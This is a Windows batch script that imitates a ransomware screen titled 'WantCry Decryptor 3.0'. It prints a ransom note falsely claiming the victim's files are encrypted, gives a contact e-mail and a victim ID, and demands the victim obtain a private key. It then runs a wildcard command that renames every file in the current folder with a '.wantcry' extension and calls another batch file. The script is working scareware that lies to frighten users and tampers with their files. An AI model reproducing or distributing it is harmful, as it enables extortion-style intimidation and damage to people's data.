@echo off 
color 35
title WantCry Decryptor 3.0
echo ATTENTION!
echo -----------------------------------------------------------------------------------------------------
echo What happened to my files?
echo Your databases, files, photos, documents and other important files are encrypted!
echo -----------------------------------------------------------------------------------------------------
echo How can I recover my files?
echo The only method of recovering files is to get an decrypt software and unique private key.
echo After get the decryptor you will start decrypt software, enter your unique private key and it will decrypt all your data.
echo Only we can give you this key and only we can recover your files.
echo You need to contact us by e-mail and send us your personal ID and wait for further instructions.
echo Our E-mail: getdecryptor@wantcry.com
echo Your ID: 1v0v8b7vKaqHuahw7192n822Xw948Qdnw
echo -----------------------------------------------------------------------------------------------------
echo Note:
echo Restart or Shutdown your computer won't help you. Your files will still encrypted.
echo Only US can decrypt your files. 
echo ------------------------------------------------------------------------------------------------------
pause
echo Type Y if you agreed
set /p tac=
if %tac%==Y goto start
:start 
ren *.* *.wantcry
echo --------------------
echo     Don't exit 
echo --------------------
call InputKey.bat
pause 
exit
